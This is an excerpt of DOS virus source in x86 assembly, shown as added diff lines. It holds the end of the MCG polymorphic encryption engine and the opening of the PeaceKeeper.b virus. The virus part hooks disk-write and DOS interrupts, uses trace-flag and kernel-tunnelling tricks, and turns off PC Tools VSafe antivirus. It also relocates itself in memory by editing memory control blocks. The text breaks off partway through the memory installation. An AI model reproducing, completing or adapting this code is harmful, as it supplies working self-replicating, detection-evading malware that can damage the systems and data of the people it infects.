+		jmp	return_garbage_
+can_do_test:
+		and	al, 1			; 8 or 16 bit
+		or	al, 84h 		; test reg,reg base
+		or	ah, 0c0h
+		stosw
+		jmp	short garbage_way_4
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+;
+; this will generate a one byte instruction followed by a loop (using the LOOP
+; instruction) that will loop on the generated one byte instruction. this
+; routine is in the poly code but is never used.
+;
+		and	al, 7
+		mov	bx, offset one_byters	; get an one byte instruction
+		xlat
+		stosb
+		mov	ax, 0fde2h		; loop pointing to the previous
+		stosw				; one byte instruction
+		jmp	return_garbage_
+;
+; this seems a register reference table but isn't used either in this version
+; of the poly
+;
+		db    0 ; AX
+		db    1 ; CX
+		db    4 ; BP
+		db    3 ; BX
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+assign_sel:
+;
+; Offsets to possible way of assigning the value to the counter register
+;
+		dw offset assign_way_1
+		dw offset assign_way_2
+		dw offset assign_way_4
+		dw offset assign_way_3
+
+
+do_assign	proc near
+;
+; this subroutine creates code that assign the value given in the register AX
+; to the register which opcode is given in the register DH.
+;
+
+		pushf
+		push	ax				; save some regs
+		push	bx
+		push	cx
+		push	dx
+		mov	word ptr [assign_val], ax	; save inputs to
+		mov	byte ptr [assign_reg], dh	; procedure
+		call	get_rnd_num
+		db	10000011b,11100000b		; AND AX,03h
+		db	00000011b			; (opcode 83h,0e0h,03h)
+		call	mul2_in_si			; multiply to get
+							; memory offset
+		call	get_random			; rnd value for
+							; procedures
+		jmp	word ptr cs:[si + offset assign_sel]	; jump to it
+return_assign:
+		pop	dx
+		pop	cx
+		pop	bx			; restore and get back
+		pop	ax
+		popf
+		retn
+do_assign	endp
+
+; ƒƒƒƒƒƒƒ Register assignation routines ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+assign_way_1:
+;
+;	mov	assign_reg,value
+;		garbage
+;
+		mov	al, 0b8h			; mov base opcode
+		or	al, byte ptr [assign_reg]	; for the used reg
+		stosb
+		mov	ax, word ptr [assign_val]	; and store register
+		stosw					; initial value
+		call	some_garbage
+		jmp	short return_assign
+
+assign_way_2:
+;
+;	mov	rnd_reg,value
+;		garbage
+;	xchg	rnd_reg,assign_reg
+;		garbage
+;
+		and	ah, 7
+		call	select_reg_ass
+		mov	dh, ah
+		mov	al, 0b8h			; mov base opcode
+		or	al, ah				; with selected reg
+		stosb
+		mov	ax, word ptr [assign_val]	; assign the value
+		stosw
+		call	some_garbage
+		mov	al, 87h 			; xchg prefix
+		mov	ah, 0c0h			; xchg registers opcode
+		or	ah, dh				; first is the one we
+							; used before, rnd_reg
+		mov	dh, byte ptr [assign_reg]
+		sub	cx, cx
+		mov	cl, 3				; and calculate for the
+		shl	dh, cl				; assign_reg one
+		or	ah, dh
+		stosw					; store the xchg
+		jmp	short return_assign
+
+assign_way_3:
+;
+;	mov	rnd_reg,value
+;		garbage
+;	push	rnd_reg
+;		garbage
+;	pop	assign_reg
+;		garbage
+;
+		and	ah, 7
+		call	select_reg_ass
+		mov	dh, ah
+		mov	al, 0b8h			; mov base opcode
+		or	al, ah				; with selected reg
+		stosb
+		mov	ax, word ptr [assign_val]	; and value
+		stosw
+		call	some_garbage
+		mov	al, 50h 			; push base opcode
+		or	al, dh				; for rnd_reg used
+		stosb
+		call	some_garbage
+		mov	dh, byte ptr [assign_reg]	; and pop to given
+		mov	al, 58h 			; register
+		or	al, dh
+		stosb
+		jmp	short return_assign
+
+assign_way_4:
+;
+;	xor/sub assign_reg,assign_reg
+;		garbage
+;	add/or	assign_reg,value
+;		garbage
+;
+		and	al, 1
+		sub	ah, ah				; using the table
+		mov	bx, offset zero_reg		; select if zeroing
+		xlat					; using sub or xor
+		stosb
+
+		mov	bl, byte ptr [assign_reg]
+		sub	al, al
+		or	al, 0c0h			; basic prefix
+		or	al, bl				; both source and
+		mov	cl, 3				; destination will be
+		shl	bl, cl				; the given register
+		or	al, bl
+		stosb
+		call	some_garbage
+		call	get_random			; select which way to
+		and	al, 1				; correct the register
+		cmp	al, 1				; value
+		jz	correct_with_add
+		xor	ax, ax
+		mov	al, 81h 			; basic prefix
+		mov	ah, 0c8h			; OR basic opcode
+		mov	bl, byte ptr [assign_reg]	; with selected reg
+		or	ah, bl
+		stosw
+store_way_4:
+		mov	ax, word ptr [assign_val]	; and store register
+		stosw					; initial value
+		jmp	return_assign
+
+correct_with_add:
+		sub	ax, ax
+		mov	al, 81h 			; basic prefix
+		mov	bl, byte ptr [assign_reg]	; selected reg
+		or	ah, bl
+		or	ah, 0c0h			; with ADD opcode
+		stosw
+		jmp	short store_way_4
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+
+; €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
+;
+;			MCG v0.31· Poly engine entry point
+;
+;   Input parameters:
+;	AX	=	encryption value
+;	BL	=	poly engine flags
+;			  bit 0 = 1 encrypt using words, 0 using bytes
+;			  bit 1 = 1 use just reg as pointer , 0 use reg + off
+;			  bit 2 = 1 use SI as pointer, 0 use DI as pointer
+;			  bit 3 = 1 use LOOP in dec loop, 0 use DEC counter
+;			  bit 4 = 0 use ADD for encryption, 1 don't use ADD
+;			  bit 5 = 0 use SUB for encryption, 1 don't use SUB
+;				 This is overridden by bit 4. If either
+;				 bit 4 and bit 5 are 1 the XOR is used
+;			  bit 6 = 1 for no garbage, 0 for garbage
+;	BP	=	offset at which the decryptor will run
+;	ES:DI	=	where to place generated code
+;
+;   Output parameters:
+;	CX	=	decryptor length
+;	DS:DX	=	pointer to decryptor
+;
+;
+
+mcg_start	proc near
+		cld
+		push	cs
+		push	cs
+		pop	ds
+		pop	es
+		mov	word ptr [encrypt_key], ax	; store input paras
+		mov	byte ptr [poly_flags], bl	; and do some inits
+		mov	word ptr [run_offset], bp
+		mov	word ptr [decrypt_start], di
+		mov	byte ptr [regs_assigned], 0
+		mov	byte ptr [use_loop], 1
+		test	byte ptr [poly_flags], 40h	; check if we can do
+		jnz	no_first_garb			; garbage or not
+		call	get_rnd_num
+		and	al, 0fh 			; do a number between
+		sub	cx, cx				; 01h and 10h of
+		mov	cl, al				; garbage instructions
+		inc	cx				; force at least one
+
+garbage_loop_1:
+		call	garbage_instr			; do one garbage inst
+		loop	garbage_loop_1
+
+no_first_garb:
+		test	byte ptr [poly_flags], 1	; encrypt with bytes?
+		mov	dh, 1
+		jz	do_with_bytes
+		push	dx
+		xor	dx, dx
+		mov	ax,(code_end-code_begin)	; for words must
+		mov	bx, 2				; div counter by 2
+		div	bx
+		add	ax, dx
+		pop	dx
+		call	do_assign		; make counter assignation
+		jmp	short counter_assigned
+
+do_with_bytes:
+		mov	ax,(code_end-code_begin)
+		call	do_assign		; make counter assignation
+
+counter_assigned:
+		call	some_garbage
+		test	byte ptr [poly_flags], 4	; pointer register
+		jnz	pointer_with_si
+		mov	dh, 7		; use DI as pointer
+		mov	ax, 0ffffh	; put 0ffffh, will be filled later
+		call	do_assign	; make pointer assignation
+		jmp	short pointer_assigned
+
+pointer_with_si:
+		mov	dh, 6		; use SI as pointer
+		mov	ax, 0ffffh	; put 0ffffh, will be filled later
+		call	do_assign	; make pointer assignation
+
+pointer_assigned:
+		mov	byte ptr [regs_assigned], 1
+		call	some_garbage
+		mov	word ptr [loop_start], di	; save where the real
+		call	some_garbage			; decryption loop starts
+		call	some_garbage
+		mov	al, 2eh 			; CS: segment forcing
+		stosb
+		mov	al, 81h 			; base prefix
+		test	byte ptr [poly_flags], 1	; encrypting bytes?
+		jnz	using_words_enc
+		and	al, 0feh			; so prefix becames 80h
+using_words_enc:
+		stosb
+		test	byte ptr [poly_flags], 10h	; use ADD?
+		jz	add_encryption
+		test	byte ptr [poly_flags], 20h	; use SUB?
+		jz	sub_encryption
+		mov	al, 30h 			; XOR base
+		mov	byte ptr [use_loop], 0		; force LOOP if so
+		jmp	short proceed_enc
+sub_encryption:
+		mov	al, 28h 			; SUB base
+		jmp	short proceed_enc
+add_encryption:
+		sub	al, al				; ADD base
+proceed_enc:
+		test	byte ptr [poly_flags], 4	; which pointer is used
+		jz	di_is_here
+		or	al, 4				; SI
+		jmp	short proceed_enc_2
+di_is_here:
+		or	al, 5				; DI
+proceed_enc_2:
+		stosb
+		test	byte ptr [poly_flags], 2	; using reg+off in
+		pushf					; encryption?
+		sub	ax, ax
+		popf
+		jnz	using_just_reg
+
+get_rndpnt_off:
+		call	get_rnd_num			; random offset to add
+		mov	word ptr [rnd_pnt_off], ax	; save for later too
+		push	ax
+		push	bx
+		mov	bx, 200h
+		add	bx, word ptr [run_offset]
+		sub	bx, ax
+		test	bx, 0c0h
+		pop	bx
+		pop	ax
+		jz	get_rndpnt_off
+		or	byte ptr cs:[di-1], 80h 	; change to right opc.
+		stosw					; store random off
+using_just_reg:
+		test	byte ptr [poly_flags], 1	; byte or words?
+		jz	key_is_a_byte
+		mov	ax, word ptr [encrypt_key]	; store immediate word
+		stosw					; encryption key
+		jmp	short done_key_operation
+key_is_a_byte:
+		mov	al, byte ptr [encrypt_key+1]	; if encryption is done
+		stosb					; byte by byte then key
+		jmp	short done_key_operation	; is a byte
+
+done_key_operation:
+		call	some_garbage
+		call	some_garbage
+		call	some_garbage
+		call	get_rnd_num
+		and	ah, 3				; four ways of inc
+		cmp	ah, 0				; the pointer reg
+		jz	incp_scasb
+		cmp	ah, 2
+		jz	incp_cmpsb
+		cmp	ah, 3
+		jz	incp_inc
+
+		mov	al, 81h 			; math prefix
+		mov	ah, 0c0h			; add base
+		test	byte ptr [poly_flags], 4	; used as pointer?
+		jnz	add_butsi
+		or	ah, 7				; DI
+		jmp	short add_storeit
+add_butsi:
+		or	ah, 6				; SI
+add_storeit:
+		stosw
+		test	byte ptr [poly_flags], 1	; enc word or bytes?
+		jz	using_bytes_inc
+		mov	ax, 2				; words, so + 2
+		jmp	short store_the_inc
+using_bytes_inc:
+		mov	ax, 1				; bytes, so + 1
+store_the_inc:
+		stosw
+		jmp	short pointer_incremented
+
+incp_scasb:
+		test	byte ptr [poly_flags], 4	; scasb method only
+		jnz	incp_cmpsb			; if using DI
+		mov	byte ptr [use_loop], 0		; force LOOP if so
+		mov	al, 0aeh			; scasb incs DI of 1
+		test	byte ptr [poly_flags], 1	; if doing with words
+		jz	put_the_scasb
+		or	al, 1				; then to scasw
+put_the_scasb:
+		stosb
+		jmp	short pointer_incremented
+
+incp_cmpsb:
+		mov	byte ptr [use_loop], 0		; force LOOP if so
+		mov	al, 0a6h			; cmpsb
+		test	byte ptr [poly_flags], 1	; if doing with words
+		jz	put_the_cmpsb
+		or	al, 1				; then to cmpsw
+put_the_cmpsb:
+		stosb
+		jmp	short pointer_incremented
+
+incp_inc:
+		mov	al, 40h 			; inc opcode
+		test	byte ptr [poly_flags], 4	; with the correct
+		jnz	enc_with_sir			; pointer reg
+		or	al, 7				; DI
+		jmp	short store_incpointer
+enc_with_sir:
+		or	al, 6				; SI
+store_incpointer:
+		stosb
+		test	byte ptr [poly_flags], 1	; doing with words?
+		jz	pointer_incremented
+		push	ax				; if so some garbage
+		call	some_garbage			; and then one more
+		call	some_garbage			; inc pointer
+		pop	ax
+		stosb
+
+pointer_incremented:
+		call	some_garbage
+		call	some_garbage
+		test	byte ptr [poly_flags], 8	; LOOP or DEC
+		jz	dowith_inccx
+use_loopi:
+		mov	al, 0e2h			; LOOP opcode
+make_jump_off:
+		stosb
+		mov	bx, di
+		mov	dx, word ptr [loop_start]
+		sub	bx, dx
+		mov	bh, 0ffh			; calculate the offset
+		sub	bh, bl				; of the jump to the
+		xchg	al, bh				; beginning of the
+		stosb					; decryption loop
+		jmp	short finished_loop
+
+dowith_inccx:
+		cmp	byte ptr [use_loop], 0	; if forcing LOOP then use it
+		jz	use_loopi
+		mov	al, 49h 		; dec cx, this is dec counter
+		stosb
+		call	some_garbage
+		call	some_garbage
+		call	some_garbage
+		call	get_rnd_num
+		and	ah, 1			; two types of conditional
+		cmp	ah, 1			; jump to exit the loop
+		jz	jump_with_jg
+		mov	al, 75h 		; JNE opcode
+		jmp	short make_jump_off
+jump_with_jg:
+		mov	al, 7fh 		; JG opcode
+		jmp	short make_jump_off
+
+finished_loop:
+		push	di
+		mov	bx, word ptr [decrypt_start]	; caluclate length
+		sub	di, bx				; of generated
+		mov	word ptr [dec_length], di	; decryptor
+		pop	di
+		std					; will search from
+		mov	al, 0ffh			; end to beginning
+		mov	cx, word ptr [dec_length]
+
+search_pnt_ass:
+		repne scasb				; search the pointer
+		cmp	byte ptr [di], 0ffh		; assignation in
+		jnz	search_pnt_ass			; generated code
+		cld					; (the FFFFh word)
+		mov	ax, word ptr [dec_length]
+		add	ax, word ptr [run_offset]
+		test	byte ptr [poly_flags], 2
+		jnz	adjust_for_off
+		sub	ax, word ptr [rnd_pnt_off]	; if using reg+off then
+							; adjust inital pnt
+adjust_for_off:
+		stosw				 ; correct pointer assignation
+		mov	cx, word ptr [dec_length]
+		mov	dx, word ptr [decrypt_start]
+		retn
+mcg_start	endp
+
+; €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
+
+
+encrypt_body	proc near
+;
+; this routine encrypts CX bytes starting from ES:DI with the key given in
+; the register DX. it uses the poly_flags data byte to decide which encryption
+; was used.
+;
+		push	di
+		push	cx
+		test	byte ptr [poly_flags], 1	; words or bytes?
+		jz	byte_by_byte
+		inc	cx
+		shr	cx, 1				; words
+word_by_word:
+		mov	dx, word ptr [encrypt_key]	; get again key
+		lodsw					; get a word
+		call	encrypt_word
+		stosw					; store encrypted one
+		loop	word_by_word
+		jmp	short finished_encrypt
+
+byte_by_byte:
+		mov	dx, word ptr [encrypt_key]	; get again key
+		lodsb					; get a byte
+		xchg	dh, dl				; if using bytes the
+		xor	dh, dh				; key is in high one
+		call	encrypt_word
+		stosb					; store encrypted one
+		loop	byte_by_byte
+		jmp	short finished_encrypt
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+encrypt_word	proc near
+		test	byte ptr [poly_flags], 10h	; add to decrypt?
+		jz	enc_subbing
+		test	byte ptr [poly_flags], 20h	; sub to decrypt?
+		jz	enc_adding
+		xor	ax, dx				; else xoring
+		retn
+enc_adding:
+		add	ax, dx			; encrypt it adding
+		retn
+enc_subbing:
+		sub	ax, dx			; encrypt it subbing
+		retn
+encrypt_word	endp
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+finished_encrypt:
+		pop	cx		; restore changed regs
+		pop	dx
+		retn			; back to caller
+encrypt_body	endp
+
+; ƒƒƒƒƒƒƒ Poly engine end ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+code_end:
+data_buffe:
+	     dw      02h		 ; Length of original code
+	     dw      code_begin-100h	 ; Offset of original code - 100h
+	     int     20h		 ; Terminate program
+
+	     db      0fah dup(?)
+data_buffe_:
+data_end:
+
+end	     code_begin
+ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[peacek_a.asm]ƒƒ
+ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[peacek_b.asm]ƒƒ
+.model tiny
+.code
+ org   100h				 ; Origin of PeaceKeeper.b
+
+code_begin:
+stack_ptr    equ     $-01h		 ; Stack pointer
+
+	     call    delta_offset
+delta_offset:
+	     pop     si 		 ; Load SI from stack
+	     sub     si,(delta_offset-code_begin)
+
+	     jmp     int01_store
+	     nop
+
+int13_virus  proc    near		 ; Interrupt 13h of PeaceKeeper.b
+	     cmp     cs:[payload_stat],00h
+	     je      int13_exit 	 ; Equal? Jump to int13_exit
+	     cmp     ah,03h		 ; Write disk sector(s)
+	     je      payload		 ; Equal? Jump to payload
+int13_exit:
+	     jmp     cs:[int13_addr]
+
+	     iret			 ; Interrupt return
+payload:
+	     push    ax bx		 ; Save registers at stack
+	     call    get_rnd_num
+	     and     ah,00000111b	 ; AH = random number within seven
+	     and     al,00000111b	 ; AL =   "      "      "      "
+
+	     cmp     ah,00000111b	 ; Write disk sector(s)?
+	     jmp     write_sector
+	     cmp     al,00000110b	 ; Write disk sector(s)?
+	     jne     write_sector	 ; Not equal? Jump to write_sector
+	     pop     bx ax		 ; Load registers from stack
+
+	     clc			 ; Clear carry flag
+
+	     iret			 ; Interrupt return
+write_sector:
+	     pop     bx ax		 ; Load registers from stack
+
+	     jmp     int13_exit
+	     endp
+
+int01_virus  proc    near		 ; Interrupt 01h of PeaceKeeper.b
+	     cmp     cs:[si+trace_status-100h],00h
+	     jne     int01_exit 	 ; Not equal? Jump to int01_exit
+
+	     mov     cs:[si+trace_status-100h],01h
+
+	     pushf			 ; Save flags at stack
+	     pop     ax 		 ; Load AX from stack
+	     and     ax,1111111011111111b
+	     push    ax 		 ; Save AX at stack
+	     popf			 ; Load flags from stack
+
+	     jmp     int01_load
+int01_exit:
+	     iret			 ; Interrupt return
+	     endp
+int01_store:
+	     sub     ax,ax		 ; Zero AX
+	     mov     es,ax		 ; ES = segment of interrupt table
+
+	     cli			 ; Clear interrupt-enable flag
+	     mov     dx,es:[(01h*04h)]	 ; Get interrupt vector 01h
+	     mov     cx,es:[(01h*04h+02h)]
+	     sti			 ; Set interrupt-enable flag
+
+	     lea     ax,[si+int01_virus-100h]
+
+	     mov     cs:[si+trace_status-100h],00h
+
+	     mov     es:[(01h*04h)],ax	 ; Set interrupt vector 01h
+	     mov     es:[(01h*04h+02h)],cs
+
+	     pushf			 ; Save flags at stack
+	     pop     ax 		 ; Load AX from stack
+	     or      ax,0000000100000000b
+	     push    ax 		 ; Save AX at stack
+	     popf			 ; Load flags from stack
+
+	     nop
+
+	     int     20h		 ; Terminate program
+int01_load:
+	     cli			 ; Clear interrupt-enable flag
+	     mov     es:[(01h*04h)],dx	 ; Set interrupt vector 01h
+	     mov     es:[(01h*04h+02h)],cx
+	     sti			 ; Set interrupt-enable flag
+
+	     jmp     get_dos_ver
+
+init_rnd_num proc    near		 ; Initialize 32-bit random number
+	     push    cx 		 ; Save CX at stack
+	     call    init_rnd_nu_
+
+	     db      10000011b,11100000b ; AND AX,0Fh (opcode 83h,0e0h,0fh)
+	     db      00001111b
+	     inc     ax 		 ; AX = random number within sixteen
+	     xchg    ax,cx		 ; CX =   "      "      "       "
+calc_rnd_num:
+	     call    get_rnd_num
+
+	     loop    calc_rnd_num
+	     pop     cx 		 ; Load CX from stack
+
+	     ret			 ; Return
+	     endp
+
+init_rnd_nu_ proc    near		 ; Initialize 32-bit random number
+	     push    dx cx		 ; Save registers at stack
+
+	     mov     ah,2ch		 ; Get system time
+	     int     21h
+
+	     in      al,40h		 ; AL = 8-bit random number
+	     mov     ah,al		 ; AH =   "     "      "
+	     in      al,40h		 ; AL =   "     "      "
+
+	     xor     ax,cx		 ; AX = low-order word of 32-bit r...
+	     xor     dx,ax		 ; DX = high-order word of 32-bir ...
+
+	     jmp     sto_rnd_num
+	     endp
+
+get_rnd_num  proc    near		 ; Get 32-bit random number
+	     push    dx cx		 ; Save registers at stack
+	     push    bx 		 ; Save BX at stack
+
+random_num   equ     word ptr $+01h	 ; Low-order word of 32-bit random ...
+	     mov     ax,00h		 ; AX = low-order word of 32-bit ra...
+random_num_  equ     word ptr $+01h	 ; High-order word of 32-bit random...
+	     mov     dx,00h		 ; DX = high-order word of 32-bit r...
+
+	     mov     cx,07h		 ; Rotate 32-bit random number thro...
+calc_rnd_nu_:
+	     shl     ax,01h		 ; Shift logical left low-order wor...
+	     rcl     dx,01h		 ; Rotate left high-order word of 3...
+
+	     mov     bl,al		 ; BL = low-order byte of low-order...
+	     xor     bl,dh		 ; Exclusive OR high-order byte of ...
+	     jns     dont_inc_rnd	 ; No sign? Jump to dont_inc_rnd
+
+	     inc     al 		 ; Increase low-order byte of low-or...
+dont_inc_rnd:
+	     loop    calc_rnd_nu_
+	     pop     bx 		 ; Load BX from stack
+sto_rnd_num:
+	     mov     word ptr cs:[random_num],ax
+	     mov     word ptr cs:[random_num_],dx
+
+	     mov     al,dl		 ; AL = low-order byte of high-orde...
+
+	     pop     cx dx		 ; Load registers from stack
+
+	     ret			 ; Return
+	     endp
+virus_exit:
+	     cmp     [si+execute_stat-100h],00h
+	     je      vir_com_exit	 ; COM executable? Jump to vir_com_...
+	     cmp     [si+execute_stat-100h],01h
+	     je      vir_exe_exit	 ; EXE executable? Jump to vir_exe_...
+eternal_loop:
+	     jmp     eternal_loop
+vir_exe_exit:
+	     mov     ax,[si+program_seg-100h]
+	     mov     ds,ax		 ; DS = segment of Program Segment ...
+	     mov     es,ax		 ; ES =    "    "     "       "     "
+	     mov     dx,ds		 ; DX =    "    "     "       "     "
+
+	     add     dx,10h		 ; DX = segment of beginning of code
+	     mov     cx,dx		 ; CX =    "    "      "     "   "
+	     add     dx,cs:[si+initial_ss-100h]
+
+	     cli			 ; Clear interrupt-enable flag
+	     mov     ss,dx		 ; SS = initial SS relative to star...
+	     mov     sp,cs:[si+initial_sp-100h]
+	     sti			 ; Set interrupt-enable flag
+
+	     add     cx,cs:[si+initial_cs-100h]
+	     push    cx 		 ; Save initial SS relative to star...
+
+	     push    word ptr cs:[si+initial_ip-100h]
+
+	     retf			 ; Return far
+vir_com_exit:
+	     mov     cx,[si+poly_parts-100h]
+	     lea     si,[si+data_buffe-100h]
+
+	     push    cs 		 ; Save CS at stack
+	     pop     es 		 ; Load ES from stack (CS)
+
+	     cld			 ; Clear direction flag
+restore_loop:
+	     push    cx 		 ; Save CX at stack
+	     lodsw			 ; AX = length of original part
+	     mov     cx,ax		 ; CX =   "    "     "      "
+
+	     lodsw			 ; AX = offset "     "      "
+	     mov     di,ax		 ; DI =   "    "     "      "
+	     add     di,100h		 ; Add offset of beginning of code ...
+	     rep     movsb		 ; Move original code to offset of ...
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    restore_loop
+
+	     push    cs 		 ; Save CS at stack
+
+	     mov     ax,100h		 ; AX = offset of beginning of code
+	     push    ax 		 ; Save AX at stack
+
+	     retf			 ; Return far
+error_:
+	     stc			 ; Set carry flag
+
+	     ret			 ; Return
+no_error:
+	     clc			 ; Clear carry flag
+
+	     ret			 ; Return
+
+tunneler     proc    near		 ; Tunneler of PeaceKeeper.b
+	     mov     ah,34h		 ; Get address of InDOS flag
+	     int     21h
+
+	     push    es 		 ; Save ES at stack
+	     mov     ax,[si+dos_version-100h]
+	     sub     ah,ah		 ; AX = major version number
+
+	     sub     bx,bx		 ; Zero BX
+	     mov     bx,03h		 ; BX = DOS version number
+	     mov     cx,04h		 ; Compare four times
+find_dos_ver:
+	     db      00111000b,11011000b ; CMP AL,BL (opcode 38h,0d8h)
+	     je      found_ver		 ; Equal? Jump to found_ver
+
+	     inc     bl 		 ; Increase DOS version number
+	     inc     ah 		 ; Increase DOS version counter
+	     loop    find_dos_ver
+
+	     jmp     error_
+found_ver:
+	     sub     al,al		 ; Zero AL
+	     xchg    al,ah		 ; AL = DOS version counter
+	     mov     bx,04h		 ; Multiply by four
+	     mul     bx 		 ; AX = DOS version counter multipl...
+	     lea     bx,[si+scan_strings-100h]
+	     add     bx,ax		 ; BX = offset within scan_strings
+	     pop     ax 		 ; Load AX from stack (ES)
+
+	     call    find_kernel
+	     endp
+
+exam_kernel  proc    near		 ; Examine DOS kernel in High Memor...
+	     cmp     dx,[bx]		 ; DOS kernel?
+	     jne     not_kernel 	 ; Not equal? Jump to not_kernel
+
+	     mov     dx,es:[si+02h]	 ; DX = two bytes of DOS data segment
+	     cmp     dx,[bx+02h]	 ; DOS kernel?
+	     jne     not_kernel 	 ; Not equal? Jump to not_kernel
+
+	     jmp     error_
+not_kernel:
+	     jmp     no_error
+	     endp
+
+find_kernel  proc    near		 ; Find DOS kernel in High Memory A...
+	     mov     di,si		 ; DI = delta offset
+	     mov     es,ax		 ; ES = segment of DOS data segment
+	     mov     si,100h		 ; SI = offset of DOS data segment
+	     mov     cx,1388h		 ; Search through five thousand bytes
+find_kernel_:
+	     mov     dx,es:[si] 	 ; DX = two bytes of DOS data segment
+	     cmp     dh,[bx]		 ; DOS kernel?
+	     jne     not_kernel_	 ; Not equal? Jump to not_kernel_
+
+	     call    exam_kernel
+	     jc      found_kernel	 ; Found DOS kernel? Jump to found_...
+not_kernel_:
+	     inc     si 		 ; Increase offset of DOS data segment
+	     loop    find_kernel_
+
+	     jmp     error_
+found_kernel:
+	     mov     word ptr [di+int21_addr-100h],si
+	     mov     word ptr [di+int21_addr-100h+02h],es
+
+	     mov     si,di		 ; SI = delta offset
+
+	     jmp     no_error
+	     endp
+
+	     nop
+get_dos_ver:
+	     mov     ah,30h		 ; Get DOS version
+	     int     21h
+
+	     mov     cs:[si+dos_version-100h],ax
+	     mov     cs:[si+program_seg-100h],ds
+
+	     push    cs 		 ; Save CS at stack
+	     pop     ds 		 ; Load DS from stack
+
+	     mov     bp,si		 ; BP = delta offset
+
+	     mov     ax,0deadh		 ; PeaceKeeper.b function
+	     int     21h
+	     cmp     bx,ax		 ; Already resident?
+	     jne     test_dos_ver	 ; Not equal? Jump to test_dos_ver
+
+	     jmp     virus_exit
+test_dos_ver:
+	     mov     ax,[si+dos_version-100h]
+	     cmp     al,03h		 ; DOS v 3.xx?
+	     jge     test_vsafe 	 ; Greater or equal? Jump to test_v...
+
+	     jmp     virus_exit
+test_vsafe:
+	     mov     ax,0fa00h		 ; PC tools v8+ vsafe, vwatch insta...
+	     mov     dx,5945h		 ; "    "    "    "      "       "
+	     int     16h
+	     cmp     di,4559h		 ; Installed?
+	     jne     get_int_vec	 ; Not equal? Jump to get_int_vec
+
+	     mov     ax,0fa01h		 ; PC tools v8+ vsafe, vwatch unins...
+	     mov     dx,5945h		 ; "    "    "    "      "       "
+	     int     16h
+get_int_vec:
+	     mov     ax,3513h		 ; Get interrupt vector 13h
+	     int     21h
+	     mov     word ptr [si+int13_addr-100h],bx
+	     mov     word ptr [si+int13_addr-100h+02h],es
+
+	     mov     ax,3521h		 ; Get interrupt vector 21h
+	     int     21h
+	     mov     word ptr [si+int21_addr_-100h],bx
+	     mov     word ptr [si+int21_addr-100h],bx
+	     mov     word ptr [si+int21_addr_-100h+02h],es
+	     mov     word ptr [si+int21_addr-100h+02h],es
+
+	     call    tunneler
+
+	     mov     ax,[si+dos_version-100h]
+	     cmp     al,04h		 ; DOS v 4.xx?
+	     jl      get_sys_date	 ; Less? Jump to get_sys_date
+
+	     mov     ax,6900h		 ; Get disk serial number
+	     mov     bl,03h		 ; Drive C:
+	     lea     dx,[si+data_buffer-100h]
+	     int     21h
+
+	     mov     ah,[si+data_buffer+02h-100h]
+	     mov     [si+flags-100h],ah  ; Store flags
+
+	     jmp     examine_mcb
+get_sys_date:
+	     mov     ah,2ah		 ; Get system date
+	     int     21h
+
+	     mov     [si+flags-100h],dh  ; Store flags
+examine_mcb:
+	     mov     bx,[si+program_seg-100h]
+	     dec     bx 		 ; BX = segment of Memory Control B...
+	     mov     es,bx		 ; ES =    "    "    "       "     "
+	     sub     bx,bx		 ; Zero BX
+
+	     cmp     byte ptr es:[bx],'Z'
+	     je      allocate_mem	 ; Equal? Jump to allocate_mem
+
+	     jmp     virus_exit
+allocate_mem:
+	     mov     ax,(data_end-code_begin+0fh)/10h+84h
+	     sub     es:[bx+03h],ax	 ; Subtract size of virus in memory...
+	     sub     es:[bx+12h],ax	 ;    "      "   "    "   "      "
+	     mov     es,es:[bx+12h]	 ; ES = segment of allocated memory...
+
+	     push    si 		 ; Save SI at stack
+	     sub     cx,cx		 ; Zero CX
+	     sub     di,di		 ; Zero DI
+	     or      di,offset code_begin
+	     or      cx,(code_end-code_begin)
+	     rep     movsb		 ; Move virus to top of memory
+	     pop     si 		 ; Load SI from stack
+
+	     mov     ax,2521h		 ; Set interrupt vector 21h
+
+	     push    ds 		 ; Save DS at stack
+	     push    es 		 ; Save ES at stack
